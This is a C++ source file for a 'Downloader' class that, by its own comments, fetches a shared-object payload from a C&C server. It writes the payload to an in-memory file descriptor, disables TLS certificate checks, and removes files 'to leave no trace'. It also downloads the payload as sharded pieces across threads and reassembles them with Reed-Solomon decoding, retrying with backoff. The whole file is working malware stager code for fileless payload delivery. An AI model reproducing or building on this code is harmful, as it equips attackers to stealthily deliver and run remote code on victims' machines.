#include "download.hpp"
#include "util/logger.hpp"
#include "util/profiler.hpp"




// Download our share object from a C&C via HTTPs
struct file_descriptor* Downloader::download(std::string url) {
    Logger* logger = Logger::getInstance();
    logger->log(LogLevel::DBG, "Downloader::download", "Downloading from " + url);

    CURL *curl;
    CURLcode res;
    struct file_descriptor* f;

    f = get_fd_archdep(); // Give me a file descriptor to memory
    logger->log(LogLevel::DBG, "Downloader::download", "File Descriptor Shared Memory created!");

    // We use cURL to download the file
    // It's easy to use and we avoid to write unnecesary code
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        // curl_easy_setopt(curl, CURLOPT_USERAGENT, "Too lazy to search for one");
        // curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 2L); // Connection timeout=2 seconds
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L); // Connection sometimes fails when t=2 seconds
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, f->fd); //Args for our callback

        // Do the HTTPs request!
        res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            if (response_code == 200) {
                logger->log(LogLevel::DBG, "Downloader::download", url + " cURL'ed to " + f->filename);
                curl_easy_cleanup(curl); // cleanup. don't fopen, it breaks things.
                return f;
            }
            else {
                logger->log(LogLevel::ERR, "Downloader::download", "cURL of " + url + " errored with " + std::to_string(response_code));
            }
        }
        else {
            logger->log(LogLevel::ERR, "Downloader::download", "cURL of " + url + " failed with " + curl_easy_strerror(res));
        }
        curl_easy_cleanup(curl); // cleanup. don't fopen, it breaks things.
    }
    else {
        logger->log(LogLevel::ERR, "Downloader::download", "Major error, curl_easy_init returned false.");
    }
    close(f->fd);
    remove(f->filename); // remove file to leave no trace
    free(f->filename);
    free(f);
    return NULL;
}



// Function pulls shards and encrypted blob
// and unshards and writes out results comparable to download() function
// download_url contains the base template for shards
struct file_descriptor* Downloader::download_and_unshard(std::vector<std::string> urls) {
    Logger* logger = Logger::getInstance();
    logger->log(LogLevel::DBG, "Downloader::download_and_unshard", "[" + urls[0] + ", ...] " + std::to_string(urls.size()));

    char* fn = NULL;
    unsigned int num_shards = urls.size();
    struct file_descriptor* f;
    struct file_descriptor *shards[num_shards];

    logger->log(LogLevel::INFO, "Downloader::download_and_unshard", "Downloading shards");

    assert(num_shards > 0);

    Profiler* p = Profiler::getInstance();
    p->beginProfilerSection("download_shards");


    // initialize libcurl before any threads are started
    curl_global_init(CURL_GLOBAL_ALL);

    pthread_t tid[num_shards];

    // // for testing non-multithreading
    // for (int i=0; i<num_shards; i++){
    //     shards[i] = download_with_retry_hardcoded(urls[i]);
    // }

    // loop for starting threads
    for (int i = 0; i < num_shards; i++)
    {
        int error = pthread_create(&tid[i],
                                   NULL, /* default attributes please */
                                   (void*(*)(void*))download_with_retry_hardcoded,
                                   (void*)(urls[i]).c_str());
        if(error != 0) {
            logger->log(LogLevel::ERR, "Downloader::download_and_unshard", "Couldn't run thread number " + std::to_string(i) + ", errno " + std::to_string(error));
        }
        else {
            logger->log(LogLevel::DBG, "Downloader::download_and_unshard", "Thread " + std::to_string(i) + ", gets " + urls[i]);
        }
    }

    // loop for joining threads
    for(int i = 0; i < num_shards; i++) {
        // if pthread_join reutrns -1, it is a failure.
        if (pthread_join(tid[i], (void**)&f) >= 0) {
            shards[i] = f;
        }
        else {
            logger->log(LogLevel::ERR, "Downloader::download_and_unshard", "Thread " + std::to_string(i) + " has failed to join");
            shards[i] = NULL;
        }

        logger->log(LogLevel::DBG, "Downloader::download_and_unshard", "Thread " + std::to_string(i) + " completed. (f==NULL)=" + (f==NULL?"true":"false"));
    }

    p->endProfilerSection("download_shards");

    // curl_global_cleanup(); // see https://curl.se/libcurl/c/curl_global_cleanup.html before uncommenting. this is not thread safe

    f = get_fd_archdep(); // Give me a file descriptor to memory
    if (f == NULL) {
        logger->log(LogLevel::ERR, "Downloader::download_and_unshard", "get_fd_archdep failed in download_and_unshard.");
        exit(1);
    }

    // sss_unshard_fd(shards, num_shards, f->filename, SHARDS_REQUIRED, SHARDS_TOTAL);
    // sss_unshard_fd(shards, f->filename);
    // unshard_fd(shards, f->filename);
    p->beginProfilerSection("unshard");
    unshard_fd(shards, num_shards, f, RS_SHARDS_REQUIRED, RS_SHARDS_TOTAL);
    p->endProfilerSection("unshard");


    // for (int i = 0; i < num_shards; i++) {
    //     if (shards[i] != NULL) {
    //         free(shards[i]);
    //     }
    // }

    logger->log(LogLevel::INFO, "Downloader::download_and_unshard", "Combined shards from [" + urls[0] + ", ...] to " + f->filename);

    return f;
}


struct file_descriptor* Downloader::download_with_retry(const char *url, int max_retries, int ms_between_retry) {
    /* downloads url. retries max_retries times, with exponential backoff starting with ms_between_retry.
    returns NULL on failure */
    Logger* logger = Logger::getInstance();
    logger->log(LogLevel::DBG, "Downloader::download_with_retry", 
        "download_with_retry(" + std::string(url) + "," + std::to_string(max_retries) + "," + std::to_string(ms_between_retry) + ")"
    );

    int num_tries = 0;
    struct file_descriptor* downloaded = NULL;
    while (num_tries < max_retries) {
        downloaded = download(url);
        if (downloaded != NULL) {
            logger->log(LogLevel::DBG, "Downloader::download_with_retry", "download_with_retry() SUCCESS, returning " + std::string(downloaded->filename));
            return downloaded;
        } else {
            sleep_ms(ms_between_retry << num_tries);
        }
        num_tries++;
    }

    logger->log(LogLevel::ERR, "Downloader::download_with_retry", 
        "download_with_retry(" + std::string(url) + "," + std::to_string(max_retries) + "," + std::to_string(ms_between_retry) + ") FAILED, return NULL"
    );
    return NULL;
}

struct file_descriptor* Downloader::download_with_retry_hardcoded(const char *url) {
    // for some reason, passing a struct with url, max_retries, and ms_between_retry
    // didn't work. I suspect it is because curl + OpenSSL isn't threadsafe without
    // underlying OS libraries (see: https://curl.se/libcurl/c/threadsafe.html)
    // which I believe is the issue when dockerizing.
    int max_retries = 5;
    int ms_between_retry = 50;
    return download_with_retry(url, max_retries, ms_between_retry);
}


